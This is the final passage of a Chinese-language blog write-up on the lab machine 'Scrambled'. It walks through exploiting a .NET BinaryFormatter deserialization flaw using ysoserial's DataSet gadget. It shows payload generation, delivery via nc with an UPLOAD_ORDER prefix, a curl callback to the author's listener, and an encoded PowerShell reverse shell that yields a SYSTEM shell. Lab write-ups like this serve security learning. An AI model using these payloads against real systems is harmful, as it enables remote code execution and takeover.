+<p>因为我也不知道对面都有哪些链子能用，所以从看着顺眼的挨个打。</p>
+<p>这里我选的<code>DataSet</code>，因为他看起来名字短。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\ysoserial.exe <span class="literal">-g</span> DataSet <span class="literal">-c</span> <span class="string">&quot;cmd /c curl 10.10.16.10&quot;</span> <span class="operator">-f</span> BinaryFormatter <span class="literal">-o</span> base64</span><br><span class="line">AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAu....</span><br></pre></td></tr></table></figure>
+
+<p>这里的话有个坑，生成时候不要用<code>&#39;</code>统一用<code>&quot;</code>，比如下面这个我用的<code>&#39;</code>来圈住命令部分</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\ysoserial.exe  <span class="literal">-g</span> DataSet <span class="literal">-c</span> <span class="string">&#x27;cmd /c curl 10.10.16.10&#x27;</span> <span class="operator">-f</span> BinaryFormatter <span class="literal">-o</span> base64</span><br><span class="line">AAEAAAD...</span><br></pre></td></tr></table></figure>
+
+<p>生成的payload解码之后是这样的</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="tag">&lt;<span class="name">ObjectDataProvider.ObjectInstance</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sd:Process</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">sd:Process.StartInfo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sd:ProcessStartInfo</span> <span class="attr">Arguments</span>=<span class="string">&quot;/c curl&quot;</span> <span class="attr">StandardErrorEncoding</span>=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> <span class="attr">StandardOutputEncoding</span>=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> <span class="attr">UserName</span>=<span class="string">&quot;&quot;</span> <span class="attr">Password</span>=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> <span class="attr">Domain</span>=<span class="string">&quot;&quot;</span> <span class="attr">LoadUserProfile</span>=<span class="string">&quot;False&quot;</span> <span class="attr">FileName</span>=<span class="string">&quot;cmd&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">sd:Process.StartInfo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">sd:Process</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ObjectDataProvider.ObjectInstance</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ObjectDataProvider</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再来比对一下<code>&quot;</code>圈住的解码后，很显然命令没了半截，所以一定要谨记。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="tag">&lt;<span class="name">ObjectDataProvider.ObjectInstance</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sd:Process</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">sd:Process.StartInfo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sd:ProcessStartInfo</span> <span class="attr">Arguments</span>=<span class="string">&quot;/c cmd /c curl 10.10.16.10&quot;</span> <span class="attr">StandardErrorEncoding</span>=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> <span class="attr">StandardOutputEncoding</span>=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> <span class="attr">UserName</span>=<span class="string">&quot;&quot;</span> <span class="attr">Password</span>=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> <span class="attr">Domain</span>=<span class="string">&quot;&quot;</span> <span class="attr">LoadUserProfile</span>=<span class="string">&quot;False&quot;</span> <span class="attr">FileName</span>=<span class="string">&quot;cmd&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">sd:Process.StartInfo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">sd:Process</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ObjectDataProvider.ObjectInstance</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ObjectDataProvider</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>把生成的base64后的载荷发送过去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> yso           </span><br><span class="line">AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0...</span><br></pre></td></tr></table></figure>
+
+<p>不管是debug日志中文件中还是反编译得到的结论，都得知了，前面加<code>UPLOAD_ORDER</code>发送给服务端，对侧就会接收。</p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-17.png" alt="alt text"></p>
+<p>所以我们也这么发送payload。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&quot;UPLOAD_ORDER;`cat yso`&quot;</span> |nc 10.10.11.168 4411</span><br><span class="line">SCRAMBLECORP_ORDERS_V1.0.3;</span><br><span class="line">ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>同时也收到对方反序列化执行了curl</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.10.11.168 - - [04/Jan/2025 08:25:17] &quot;GET / HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
+
+<p>接下来就替换载荷为revshell</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\ysoserial.exe DataSet <span class="literal">-g</span> DataSet <span class="literal">-c</span> <span class="string">&quot;powershell -e JABj.....&quot;</span> <span class="operator">-f</span> BinaryFormatter <span class="literal">-o</span> base64</span><br><span class="line">AAEAAAD/...</span><br></pre></td></tr></table></figure>
+
+<p>再一次发送，得到system用户shell</p>
+<p>getRoot</p>
+<hr>
+<blockquote>
+<p>收获良多，很好的机器</p>
+</blockquote>
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left  disabled "
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2025/01/04/Tracks-AD-Return/"
+      title="Tracks-AD-Return"
+     >
+
+    <p class="title-text">
+      
+        Tracks-AD-Return
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+
+
+
+
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2025 Flower<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
+        <i class="fa-solid fa-angle-up"></i>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.classList.remove('hide')
+        } else {
+            btn.classList.add('hide')
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
